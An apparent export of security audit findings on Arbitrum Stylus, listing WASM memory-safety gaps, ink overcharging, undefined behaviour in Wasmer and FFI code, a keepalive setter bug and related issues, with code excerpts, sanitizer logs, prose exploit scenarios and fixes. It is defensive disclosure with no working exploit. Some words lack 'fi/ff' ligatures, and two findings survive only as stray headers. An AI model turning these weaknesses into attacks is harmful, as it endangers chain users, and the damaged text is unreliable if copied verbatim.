        "body": "Arbitrum compiles user program components to WASM to be run on the network. WASM binaries do not feature modern binary protections that are available by default in native binaries; they are missing most of the common memory safety checks and are vulnerable to related attack primitives (gure 4.1). Arbitrums compilation to WASM could introduce deviations between native and on-chain execution of a user program. Figure 4.1: An overview of the attack primitives and the missing defenses in the binaries The USENIX 2020 paper Everything Old Is New Again: Binary Security of WebAssembly describes in depth the binary defenses that are missing and new attacks that can be exploited in WASM binaries if memory-unsafe operations are performed. Other languages provide memory safety in the compiler. Therefore, code that executes safely natively with such checks may not execute the same on-chain. Exploit Scenario A user creates a Stylus contract using C/C++ that contains an unsafe memory operation. The user tests the code natively, running it with all the compiler protections enabled, which prevent that operation from being an issue. However, once the user deploys the contract on-chain, an attacker exploits the unsafe memory operation with a shellcode. Recommendations Short term, provide documentation advising users to use memory-safe languages. Additionally, advise users to perform extensive testing of any memory-unsafe code that is compiled to WASM to prevent exploitable memory issues. Long term, review the state of the WASM compiler to evaluate the maturity of its binary protections.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Ink is charged preemptively for reading and writing to memory ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Some host operations for reading and writing to a WASM programs memory charge ink before it is clear whether the operations will be successful or how much ink should really be charged. For example, in the read_return_data function, the user is charged for the operation to write size bytes at the start of the host operation. However, the data to be written is the returned data of size data.len(), which could actually be smaller than the originally provided size. If data.len() is smaller than size, the user will be charged more ink than they should be. pub(crate) fn read_return_data<E: EvmApi>( mut env: WasmEnvMut<E>, dest: u32, offset: u32, size: u32, ) -> Result<u32, Escape> { let mut env = WasmEnv::start(&mut env, EVM_API_INK)?; env.pay_for_write(size.into())?; let data = env.evm_api.get_return_data(offset, size); assert!(data.len() <= size as usize); env.write_slice(dest, &data)?; let len = data.len() as u32; trace!(\"read_return_data\", env, [be!(dest), be!(offset)], data, len) } Figure 5.1: Ink is charged for writing size bytes, even though the data to be written could be smaller than size. (arbitrator/stylus/src/host.rs#L273-L289) Exploit Scenario A WASM contract calls read_return_data, passing in a very large size parameter (100 MB). The EVM API, however, returns only 32 bytes, and the user is overcharged. Recommendations Short term, modify the read_return_data function to require the user to have enough ink available for writing size bytes but to charge ink for writing only data.len() bytes. Make similar changes in all host operations that charge ink preemptively. Long term, review the way ink is charged across dierent components and levels of abstraction. Make sure it is consistent and follows how the EVM works. Document any discrepancies in the charging of ink.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Integer overow vulnerability in brotli-sys ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Running cargo audit on the codebase reveals an integer overow vulnerability in brotli-sys, a dependency inherited in the Stylus repository. The dependency does not currently have an update available to x the vulnerability. Note, however, that the aected functions are not used. Dependencies should be kept up to date with any xes to reduce the surface of potentially exploitable code. If no xes exist for vulnerabilities in dependencies, the relevant area of the code should be clearly documented for developers, including explicit warnings about the vulnerabilities, to ensure that new code does not use vulnerable dependency code. Exploit Scenario Alice, an Ochain Labs developer, adds new functionality to the system that uses the brotli-sys streaming functions that are aected by the reported vulnerability, introducing an exploitable integer overow vulnerability into the codebase. Recommendations Short term, document the brotli-sys streaming functions that are aected by the integer overow vulnerability with clear warnings for future developers making changes in the system. Long term, add cargo audit to the continuous integration pipeline to ensure that new vulnerabilities are caught quickly. Moreover, continue to monitor dependencies and update them when new versions are available.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Reliance on outdated dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Updated versions of many dependencies of Arbitrum Stylus (and its submodules) are available. Dependency maintainers commonly release updates that contain silent bug xes, so all dependencies should be periodically reviewed and updated wherever possible. Dependencies that can be updated are listed in table 7.1, as reported by cargo upgrade through the cargo upgrade --incompatible --dry-run command. Dependency Version Used Latest Available Version thiserror libc eyre sha3 1.0.33 0.2.108 0.6.5 0.10.5 1.0.49 0.2.149 0.6.8 0.10.18 Table 7.1: Dependencies in the Stylus repository for which updates are available Exploit Scenario Eve learns of a vulnerability in an outdated version of a sha3 dependency. Knowing that Stylus relies on the outdated version, she exploits the vulnerability. Recommendations Short term, update the dependencies to their latest versions wherever possible. Verify that all unit tests pass following such updates. Document any reasons for not updating a dependency. Long term, add cargo upgrade --incompatible --dry-run into the continuous integration pipeline to ensure that new vulnerabilities are caught quickly. Moreover, continue to monitor dependencies and update them when new versions are available.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. WASM validation relies on Wasmer code that could result in undened behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The use of Wasmer code for validating WASM binaries could result in undened behavior. Stylus uses Wasmer to perform a strict validation of WASM binaries before activating them. For instance, the following function computes the memory oset for each WASM binary component: fn precompute(&mut self) { /// Offset base by num_items items of size item_size, panicking on overflow fn offset_by(base: u32, num_items: u32, item_size: u32) -> u32 { base.checked_add(num_items.checked_mul(item_size).unwrap()) .unwrap() } self.vmctx_signature_ids_begin = 0; self.vmctx_imported_functions_begin = offset_by( self.vmctx_signature_ids_begin, self.num_signature_ids, u32::from(self.size_of_vmshared_signature_index()), ); self.vmctx_imported_tables_begin = offset_by( self.vmctx_imported_functions_begin, self.num_imported_functions, u32::from(self.size_of_vmfunction_import()), ); Figure 8.1: The header of the precompute function in lib/types/src/vmoffsets.rs#L282309 However, this code relies on unsafe memory operations: it is not guaranteed that the memory pointers are properly aligned, and these pointers can be dereferenced later. Dereferencing of a misaligned memory pointer is undened behavior (gure 8.2). thread '<unnamed>' panicked at /home/fuzz/projects/audit-stylus/arbitrator/tools/wasmer/lib/vm/src/instance/mod.rs: 163:18: misaligned pointer dereference: address must be a multiple of 0x8 but is 0x51700005066c Figure 8.2: Undened behavior detected when trying to validate a WASM binary with a misaligned memory pointer A second, similar issue also exists in the version of Wasmer used by Stylus and can be found by cargo-careful, by running cargo +nightly careful test. Exploit Scenario A user submits a WASM contract that triggers a dereference of a misaligned pointer, which results in a crash or degraded performance. Recommendations Short term, modify the associated code to properly align the access pointers to ensure that no undened behavior is performed. Run related tests in debug mode in the CI pipeline. Long term, perform fuzz testing of the validation, activation, and execution of WASM contracts. Upgrade to the latest version of Wasmer, which contains xes for these issues, and integrate cargo-careful into the continuous integration pipeline.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Execution of natively compiled WASM code triggers ASan warning ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "During the execution of natively compiled WASM code, certain code that handles exceptions could produce false positives in the AddressSanitizer (ASan) checks. Stylus allows users to compile WASM programs into native code and execute it, using Wasmer. While the produced native code looks correct, it seems to be incompatible with certain ASan checks on stack memory: ==1584753==WARNING: ASan is ignoring requested __asan_handle_no_return: stack type: default top: 0x7ffff106a000; bottom 0x7f7d88545000; size: 0x008268b25000 (560102264832) False positive error reports may follow For details see https://github.com/google/sanitizers/issues/189 ================================================================= ==1584753==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f7d88546ab0 at pc 0x558196e7d273 bp 0x7f7d88546a90 sp 0x7f7d88546260 WRITE of size 24 at 0x7f7d88546ab0 thread T0 #0 0x558196e7d272 in sigaltstack /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_comm on_interceptors.inc:10100:5 #1 0x558196eaa3ef in __asan::PlatformUnpoisonStacks() /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/asan_posix.cpp:45:3 #2 0x558196eb0417 in __asan_handle_no_return /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/asan_rtl.cpp:589:8 #3 0x55819b933581 in wasmer_vm::trap::traphandlers::raise_lib_trap::h08f8319f19014fcd /home/fuzz/projects/audit-stylus/arbitrator/tools/wasmer/lib/vm/src/trap/traphandler s.rs:582:5 #4 0x55819b94b2c8 in wasmer_vm_memory32_fill /home/fuzz/projects/audit-stylus/arbitrator/tools/wasmer/lib/vm/src/libcalls.rs:584: 9 #5 0x7f7f1a400202 (<unknown module>) #6 0x7f7f1a40029b (<unknown module>) Address 0x7f7d88546ab0 is a wild pointer inside of access range of size 0x000000000018. SUMMARY: AddressSanitizer: stack-buffer-overflow /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_comm on_interceptors.inc:10100: Shadow bytes around the buggy address: 0x7f7d88546800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546a00: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 =>0x7f7d88546a80: 00 00 00 f3 f3 f3[f3]f3 00 00 00 00 00 00 00 00  Figure 9.1: The header of the ASan warning While we do not see an immediate risk, the resulting code should be compatible with ASan to make sure the execution of native code can be analyzed. Recommendations Investigate the reason for the ASan warning. We were unable to nd a recommendation for this issue before the end of the engagement.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Unclear program version checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "When a program is activated, the current Stylus version of the chain is used to compile and instrument the program. If activation is successful, the program state is updated to reect that version (gure 10.1). programData := Program{ wasmSize: wasmSize, footprint: info.footprint, version: version, } return version, false, p.programs.Set(codeHash, programData.serialize()) Figure 10.1: The program version is set in ActivateProgram. (arbos/programs/programs.go#L210-L215) Additionally, as shown in gure 10.2, programs may be reactivated to update the version after Stylus updates; this is useful as instrumentation may change between versions. func (p Programs) ActivateProgram(evm *vm.EVM, program common.Address, debugMode bool) (uint16, bool, error) { statedb := evm.StateDB codeHash := statedb.GetCodeHash(program) version, err := p.StylusVersion() if err != nil { return 0, false, err } latest, err := p.CodehashVersion(codeHash) if err != nil { return 0, false, err } // Already compiled and found in the machine versions mapping. if latest >= version { return 0, false, ProgramUpToDateError() } // ... } Figure 10.2: The program version check in ActivateProgram (arbos/programs/programs.go#L169-L184) However, the check in gure 10.2 (if latest >= version) implies that a program could have been activated using a Stylus version higher than the current one, which could be the case if the chains Stylus version is reverted to a previous one after a program is activated; in that case, this check would prevent that program from being reactivated and updated with the current Stylus version. This behavior in of itself does not necessarily have to be a problem; however, as shown in gure 10.3, a program can be called through the callProgram function only when the programs activation version matches the current Stylus version of the chain, which further contradicts the check performed by the activation function. if program.version != stylusVersion { return nil, ProgramOutOfDateError(program.version) } Figure 10.3: The program activation version is checked in callProgram. (arbos/programs/programs.go#L240-L242) Recommendations Short term, consider whether reactivation of a program should be allowed only when the programs activation version is dierent from the current Stylus version. This would allow reactivation exclusively when there is a version change; however, note that this might be undesired behavior and should therefore be thoroughly studied. Long term, document the intended ow for program reactivation under a Stylus version change and consider issues and edge cases that could arise when old programs are reactivated with a dierent set of instrumentations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Memory leak in capture_hostio ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "In the capture_hostio function, the RustBytes function new calls mem::forget, but the allocation is never freed, leaking memory. This may cause excess resource consumption; however, this code appears to be used only when tracing is enabled (presumably in debug mode). fn capture_hostio(&self, name: &str, args: &[u8], outs: &[u8], start_ink: u64, end_ink: u64) { call!( self, capture_hostio, ptr!(RustBytes::new(name.as_bytes().to_vec())), ptr!(RustSlice::new(args)), ptr!(RustSlice::new(outs)), start_ink, end_ink ) } Figure 11.1: The capture_hostio function leaks memory. (stylus/arbitrator/stylus/src/evm_api.rs#263273) Recommendations Short term, have the code explicitly drop RustBytes. Alternatively, use RustSlice, which rustc will automatically free. Long term, monitor the resource consumption of nodes. For memory managed purely in Rust, run the tests with cargo miri.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Use of mem::forget for FFI is error-prone ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The documentation for std::mem::forget states that using it to transfer memory ownership across FFI boundaries is error-prone. Specically, modications that introduce panics into code that uses std::mem::forget, such as the code shown in gures 12.1 and 12.2, may cause double frees, and using a value after calling as_mut_ptr and transferring ownership of the memory is invalid. The documentation advises developers to use ManuallyDrop instead. pub unsafe extern \"C\" fn arbitrator_gen_proof(mach: *mut Machine) -> RustByteArray { let mut proof = (*mach).serialize_proof(); let ret = RustByteArray { ptr: proof.as_mut_ptr(), len: proof.len(), capacity: proof.capacity(), }; std::mem::forget(proof); ret } Figure 12.1: The ownership of proofs memory is transferred to ret. (stylus/arbitrator/prover/src/lib.rs#368377) unsafe fn write(&mut self, mut vec: Vec<u8>) { self.ptr = vec.as_mut_ptr(); self.len = vec.len(); self.cap = vec.capacity(); mem::forget(vec); } Figure 12.2: The ownership of vecs memory is transferred to self. (stylus/arbitrator/stylus/src/lib.rs#8489) Recommendations Short term, use ManuallyDrop instead of std::mem::forget in the aforementioned code to more robustly manage memory manually. Long term, follow best practices outlined in Rusts stdlib and test the code thoroughly for leaks and memory corruption.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of safety documentation for unsafe Rust ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The Rust codebases unsafe blocks lack safety comments explaining their invariants and sound usage. Furthermore, safe code and unsafe code are mixed in functions declared unsafe without distinguishing which blocks of code are unsafe. In future versions of Rust, this pattern may be agged as a warning or even a hard error. Generally, the code would be less ambiguous if unsafe code were explicitly separated into dedicated blocks even if the overall function scope is unsafe. The following output of running clippy -- -D clippy::undocumented_unsafe_blocks shows the unsafe Rust blocks in Stylus that lack documentation on their safety assumptions. ... error: unsafe block missing a safety comment --> tools/wasmer/lib/types/src/value.rs:32:29 .field(\"bytes\", unsafe { &self.bytes }) | 32 | | | = help: consider adding a safety comment on the preceding line = help: for further information visit ^^^^^^^^^^^^^^^^^^^^^^ https://rust-lang.github.io/rust-clippy/master/index.html#undocumented_unsafe_blocks error: unsafe block missing a safety comment --> tools/wasmer/lib/types/src/value.rs:41:17 | 41 | | ... unsafe { self.$f == *o } ^^^^^^^^^^^^^^^^^^^^^^^^ Figure 13.1: Output of the Clippy linter Unsafe Rust blocks should always contain safety comments explaining why the unsafe Rust is sound and does not exhibit undened behavior. Even if the code is not currently being used in a way that creates undened behavior, the current Stylus APIs can be used in an unsound manner. Consider the following example: let x = vec![1u8; 1000]; let y = GoSliceData{ ptr: x.as_ptr(), len: 1000 }; let mut a = RustBytes::new(x); unsafe { stylus_vec_set_bytes(&mut a as *mut RustBytes, y); } Figure 13.2: Example code allowing unsafe behavior Miri (a tool for detecting undened behavior) issues a warning on the code in gure 13.2: Undefined Behavior: deallocating while item [SharedReadOnly for <1851>] is strongly protected by call 812 Figure 13.3: Miris output when run on the code in gure 13.2 The stylus_vec_set_bytes function does not contain sucient documentation that covers this possible unsafe use. /// /// # Safety /// /// `rust` must not be null. #[no_mangle] pub unsafe extern \"C\" fn stylus_vec_set_bytes(rust: *mut RustBytes, data: GoSliceData) { let rust = &mut *rust; let mut vec = Vec::from_raw_parts(rust.ptr, rust.len, rust.cap); vec.clear(); vec.extend(data.slice()); rust.write(vec); } Figure 13.4: The stylus_vec_set_bytes function (stylus/arbitrator/stylus/src/lib.rs#201213) The unsafe write function also lacks documentation highlighting its possible misuse: unsafe fn write(&mut self, mut vec: Vec<u8>) { self.ptr = vec.as_mut_ptr(); self.len = vec.len(); self.cap = vec.capacity(); mem::forget(vec); } Figure 13.5: The unsafe write function (stylus/arbitrator/stylus/src/lib.rs#8489) The write function will leak memory if called consecutively without explicitly freeing vec, such as by using stylus_vec_set_bytes (gure 13.6), but this is undocumented. let one = vec![]; let mut two = RustBytes::new(one); unsafe { two.write(vec![1u8; 1000]); two.write(vec![1u8; 1000]); } Figure 13.6: An example of how write could be misused For functions that are called via Cgo, we recommend documenting where memory is allocated and whether the caller is responsible for manually freeing the memory or, in the case of Go, whether it will be garbage collected. Recommendations Short term, set the undocumented_unsafe_blocks, unsafe_op_in_unsafe_fn, and missing_safety_doc lints to deny. Long term, ensure that any implicit assumptions are documented in the code so that they are not forgotten.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Undened behavior when passing padded struct via FFI ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Union types used in Wasmer that cross FFI boundaries and unconditionally transmute between instances of vmctx and host_env are not derived from repr(C), which could lead to undened behavior due to inconsistent padding. An example is shown in gures 14.1 and 14.2. Types that cross FFI boundaries should be derived from repr(C) so that the order, size, and alignment of elds is exactly what you would expect from C or C++, as documented in the Rustonomicon. #[derive(Copy, Clone, Eq)] pub union VMFunctionContext { /// Wasm functions take a pointer to [`VMContext`]. pub vmctx: *mut VMContext, /// Host functions can have custom environments. pub host_env: *mut std::ffi::c_void, } impl VMFunctionContext { /// Check whether the pointer stored is null or not. pub fn is_null(&self) -> bool { unsafe { self.host_env.is_null() } } } Figure 14.1: A union that is used across FFI boundaries (wasmer/lib/vm/src/vmcontext.rs#2538) /// Call the wasm function pointed to by `callee`. /// /// * `vmctx` - the callee vmctx argument /// * `caller_vmctx` - the caller vmctx argument /// * `trampoline` - the jit-generated trampoline whose ABI takes 4 values, the callee vmctx, the caller vmctx, the `callee` argument below, and then the /// /// `values_vec` argument. /// * `callee` - the third argument to the `trampoline` function /// * `values_vec` - points to a buffer which holds the incoming arguments, and to /// which the outgoing return values will be written. /// /// # Safety /// /// Wildly unsafe because it calls raw function pointers and reads/writes raw /// function pointers. pub unsafe fn wasmer_call_trampoline( trap_handler: Option<*const TrapHandlerFn<'static>>, config: &VMConfig, vmctx: VMFunctionContext, trampoline: VMTrampoline, callee: *const VMFunctionBody, values_vec: *mut u8, ) -> Result<(), Trap> { catch_traps(trap_handler, config, || { mem::transmute::<_, extern \"C\" fn(VMFunctionContext, *const VMFunctionBody, *mut u8)>( trampoline, )(vmctx, callee, values_vec); }) } Figure 14.2: A call to a foreign interface with the union shown in gure 14.1 (wasmer/lib/vm/src/trap/traphandlers.rs#642670) Recommendations Short term, derive types that cross FFI boundaries from repr(C). Long term, enable Clippys default_union_representation lint and integrate cargo miri into the testing of Wasmer. 15. Styluss 63/64th gas forwarding di\u0000ers from go-ethereum Severity: Low Diculty: Low Type: Undened Behavior Finding ID: TOB-STYLUS-15 Target: audit-stylus/arbos/programs/api.go, audit-stylus/arbitrator/stylus/src/host.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. Undocumented WASM/WAVM limits ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "When a user WASM program is parsed, certain limits are enforced in the program (gure 19.1). These limits are undocumented, so they might be unexpected for users. Additionally, while those limits serve as protection against denial of service and extra checks for bugs, not all of the WASM binary elds are explicitly limited. For example, the number of imports (the imports eld) is not checked, yet this number is constrained by the imports available to the implementation (VM, host modules, etc.). pub fn parse_user(wasm: &'a [u8], page_limit: u16, compile: &CompileConfig) -> Result<(WasmBinary<'a>, StylusData, u16)> { // ... // ensure the wasm fits within the remaining amount of memory if pages > page_limit.into() { let limit = page_limit.red(); bail!(\"memory exceeds limit: {} > {limit}\", pages.red()); } // not strictly necessary, but anti-DoS limits and extra checks in case of bugs macro_rules! limit { ... } limit!(1, bin.memories.len(), \"memories\"); limit!(100, bin.datas.len(), \"datas\"); limit!(100, bin.elements.len(), \"elements\"); limit!(1_000, bin.exports.len(), \"exports\"); limit!(1_000, bin.tables.len(), \"tables\"); limit!(10_000, bin.codes.len(), \"functions\"); limit!(50_000, bin.globals.len(), \"globals\"); for function in &bin.codes { limit!(4096, function.locals.len(), \"locals\") } let table_entries = bin.tables.iter().map(|x| x.initial).saturating_sum(); limit!(10_000, table_entries, \"table entries\"); let max_len = 500; macro_rules! too_long { ... } if let Some((name, _)) = bin.exports.iter().find(|(name, _)| name.len() > max_len) { too_long!(\"name\", name.len()) } if bin.names.module.len() > max_len { too_long!(\"module name\", bin.names.module.len()) } if bin.start.is_some() { bail!(\"wasm start functions not allowed\"); } Figure 16.1: Limits enforced in parse_user (arbitrator/prover/src/binary.rs#L585-L648) Recommendation Short term, document the limits enforced on parsed WASM programs along with an explanation of how those limits were chosen. Also, consider whether limits for currently unchecked elds such as imports should be set. Long term, benchmark the chosen limits to make sure they do not allow for any denial-of-service scenario.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Missing sanity checks for argumentData instruction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The argumentData instruction is missing sanity checks in certain cases. In most cases, argumentData is checked to ensure it does not contain any unexpected and unwanted bits, as is done in the executeCrossModuleCall function. // Jump to the target uint32 func = uint32(inst.argumentData); uint32 module = uint32(inst.argumentData >> 32); require(inst.argumentData >> 64 == 0, \"BAD_CROSS_MODULE_CALL_DATA\"); Figure 17.1: A check for unexpected higher bits (stylus-contracts/src/osp/OneStepProver0.sol#158161) However, in some cases, such as in the executeCrossModuleInternalCall function (gure 17.2), argumentData is simply truncated or unchecked. uint32 internalIndex = uint32(inst.argumentData); uint32 moduleIndex = mach.valueStack.pop().assumeI32(); Module memory calledMod; Figure 17.2: The argumentData instruction is truncated. (stylus-contracts/src/osp/OneStepProver0.sol#174176) Additionally, the executeConstPush function does not check argumentData for set upper bits when its value is an I32. function executeConstPush( Machine memory mach, Module memory, Instruction calldata inst, bytes calldata ) internal pure { uint16 opcode = inst.opcode; ValueType ty; if (opcode == Instructions.I32_CONST) { ty = ValueType.I32; } else if (opcode == Instructions.I64_CONST) { ty = ValueType.I64; } else if (opcode == Instructions.F32_CONST) { ty = ValueType.F32; } else if (opcode == Instructions.F64_CONST) { ty = ValueType.F64; } else { revert(\"CONST_PUSH_INVALID_OPCODE\"); } mach.valueStack.push(Value({valueType: ty, contents: uint64(inst.argumentData)})); } Figure 17.3: The executeConstPush function pushes 64 bits of argumentData to the value stack. (stylus-contracts/src/osp/OneStepProver0.sol#3859) However, this case would mean that incorrectly parsed WASM code is being executed, which is unlikely. Recommendation Short term, include the missing sanity checks for argumentData to ensure the upper bits are not set for small value types. Add these checks in all instances mentioned in the nding as well as any others that are identied. Long term, consider adding more sanity checks in areas of the code where the security of many parts relies on one assumption.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Discrepancy in EIP-2200 implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The WasmStateStoreCost function, which is an adaptation of go-ethereums makeGasSStoreFunc function, introduces a discrepancy from the original code (and a deviation from the EIP-2200 specication) when performing EIP-2200s stipend check. In particular, as shown in gure 18.2, the stipend check is performed in the original code as a less than or equal to comparison. func makeGasSStoreFunc(clearingRefund uint64) gasFunc { return func(evm *EVM, contract *Contract, stack *Stack, mem *Memory, memorySize uint64) (uint64, error) { // If we fail the minimum gas availability invariant, fail (0) if contract.Gas <= params.SstoreSentryGasEIP2200 { return 0, errors.New(\"not enough gas for reentrancy sentry\") } Figure 18.2: The original go-ethereum code (go-ethereum/core/vm/operations_acl.go#L27-L30) In Styluss version of the code, the stipend check is meant to be performed by the caller of the function. // Computes the cost of doing a state store in wasm // Note: the code here is adapted from makeGasSStoreFunc with the most recent parameters as of The Merge // Note: the sentry check must be done by the caller func WasmStateStoreCost(db StateDB, program common.Address, key, value common.Hash) uint64 { Figure 18.2: The adapted go-ethereum code in Stylus (stylus/go-ethereum/core/vm/operations_acl_arbitrum.go#L40L43) For example, the check is handled in the user_host__storage_store_bytes32 function as part of the host operations (gure 18.3). pub unsafe extern \"C\" fn user_host__storage_store_bytes32(key: usize, value: usize) { let program = Program::start(2 * PTR_INK + EVM_API_INK); program.require_gas(evm::SSTORE_SENTRY_GAS).unwrap(); [...] } Figure 18.3: The EIP-2200 stipend check performed by the caller (arbitrator/wasm-libraries/user-host/src/host.rs#L38-L40) However, the check is performed as a strictly less than comparison, thereby introducing a discrepancy from EIP-2200 and from the code being adapted (note that require_gas calls require_ink). fn require_ink(&mut self, ink: u64) -> Result<(), OutOfInkError> { let ink_left = self.ink_ready()?; if ink_left < ink { return self.out_of_ink(); } Ok(()) } Figure 18.4: The stipend check implementation (arbitrator/prover/src/programs/meter.rs) Note that in this particular case, the deviation does not lead to any security issues. This discrepancy also appears in the storage_store_bytes32 function. Recommendation Short term, modify the two aected functions so that they perform the stipend check using a less than or equal to comparison, per the EIP-2200 specication. Long term, whenever code is being adapted from a dierent source, thoroughly document any expected deviations; additionally, adapt the original tests, which can help identify any expected deviations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "19. Tests missing assertions for some errors and values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Many of the tests in the codebase perform incomplete assertions, which may prevent the tests from detecting bugs in the event of future code changes. In particular, some tests check only the following:  Whether an error was returned, but not the type or the message of the error  Whether the resulting structures eld values are as expected Additionally, the tests do not test all edge cases. For example, there are no unit tests that ensure that the enforced WASM limits (mentioned in TOB-STYLUS-16) actually work. Those issues can be seen, for example, in the provers tests, as shown in gure 19.1. #[test] pub fn reject_reexports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } #[test] pub fn reject_ambiguous_imports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } Figure 19.1: stylus/arbitrator/prover/src/test.rs#L14-L54 Recommendations Short term, apply the patch provided in appendix E to improve the quality of the tests. Long term, further refactor the tests to ensure they include assertions for all expected states of values or errors that are returned from the tested functions. 20. Machine state serialization/deserialization does not account for error guards Severity: Low Diculty: Medium Type: Undened Behavior Finding ID: TOB-STYLUS-20 Target: stylus/arbitrator/prover/src/machine.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Lack of minimum-value check for program activation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The cost for activating WASM programs is paid in native currency instead of gas. However, there is no check of the supplied native currency at the start of the program activation code. This is presumably because the cost is not known up front; nonetheless, a simple zero-value or minimum-value check could prevent the need to perform unnecessary computation if the user supplies insucient value. // Compile a wasm program with the latest instrumentation func (con ArbWasm) ActivateProgram(c ctx, evm mech, value huge, program addr) (uint16, error) { debug := evm.ChainConfig().DebugMode() // charge a fixed cost up front to begin activation if err := c.Burn(1659168); err != nil { return 0, err } version, codeHash, moduleHash, dataFee, takeAllGas, err := c.State.Programs().ActivateProgram(evm, program, debug) if takeAllGas { _ = c.BurnOut() } if err != nil { return version, err } if err := con.payActivationDataFee(c, evm, value, dataFee); err != nil { return version, err } return version, con.ProgramActivated(c, evm, codeHash, moduleHash, program, version) } Figure 21.1: WASM program activation code (stylus/precompiles/ArbWasm.go#L24-L43) Recommendation Short term, include a zero-value or minimum-value check at the start of the program activation code. Long term, review the codebase to identify any other possibly unnecessary computations that could be avoided by checks made in advance.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "22. SetWasmKeepaliveDays sets ExpiryDays instead of KeepaliveDays ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The SetWasmKeepaliveDays function sets the ExpiryDays value instead of the KeepaliveDays value, making admins unable to set the KeepaliveDays value from the Go side. // Sets the number of days after which programs deactivate func (con ArbOwner) SetWasmExpiryDays(c ctx, _ mech, days uint16) error { return c.State.Programs().SetExpiryDays(days) } // Sets the age a program must be to perform a keepalive func (con ArbOwner) SetWasmKeepaliveDays(c ctx, _ mech, days uint16) error { return c.State.Programs().SetExpiryDays(days) } Figure 22.1: stylus/precompiles/ArbOwner.go#L200L208 Exploit Scenario An admin makes a call to SetWasmKeepaliveDays with the intention of extending the life of some programs; however, they inadvertently expire all programs, as the function incorrectly sets ExpiryDays. Recommendations Short term, x the SetWasmKeepaliveDays function to properly set KeepaliveDays instead of ExpiryDays for programs. Long term, add tests to ensure that the setter and getter functions of chain properties work correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
